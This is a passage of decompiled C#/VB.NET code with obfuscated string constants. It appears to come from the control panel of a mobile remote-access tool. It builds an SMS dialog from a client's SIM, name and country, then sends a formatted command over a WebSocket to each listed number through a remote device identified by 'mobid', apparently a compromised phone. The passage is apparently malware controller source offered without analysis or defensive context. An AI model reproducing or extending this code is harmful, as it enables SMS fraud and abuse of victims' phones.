					string[] array = Btcli.sim.Split('/');
					string[] array2 = array;
					foreach (string item in array2)
					{
						sMSmaker.combosims.Items.Add(item);
					}
				}
				else if (Operators.CompareString(Btcli.sim, EXGuarder._5F4C1B40, TextCompare: false) != 0)
				{
					sMSmaker.combosims.Items.Add(Btcli.sim);
				}
				sMSmaker.mytitle.Text = BTConst.sndsmstr + EXGuarder._25201E18 + Btcli.name + EXGuarder._25201E18 + Btcli.country;
				if (sMSmaker.ShowDialog() != DialogResult.OK || sMSmaker.numslist.Items.Count <= 0)
				{
					return;
				}
				string mmssge = sMSmaker.msgtext.Text;
				string _4B47763B = EXGuarder._4B47763B;
				if (Operators.CompareString(sMSmaker.combosims.Text, EXGuarder._0D2C5B34, TextCompare: false) != 0)
				{
					_4B47763B = sMSmaker.combosims.Text;
				}
				int num = sMSmaker.numslist.Items.Count - 1;
				for (int j = 0; j <= num; j++)
				{
					string text = Conversions.ToString(sMSmaker.numslist.Items[j]);
					if (!(string.IsNullOrEmpty(text) | string.IsNullOrWhiteSpace(text)))
					{
						VB_0024AnonymousType_19<string, string, string, string> data = new VB_0024AnonymousType_19<string, string, string, string>(EXGuarder._783E5E42, mmssge, _4B47763B, text);
						string value = BTCommand.FormatCommand(EXGuarder._6C44253F, data);
						Dictionary<string, object> dictionary = new Dictionary<string, object>();
						dictionary.Add(EXGuarder._59196F45, BTConst.wrk);
						dictionary.Add(EXGuarder._1D14472D, value);
						Dictionary<string, object> chatData = dictionary;
						BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}
}
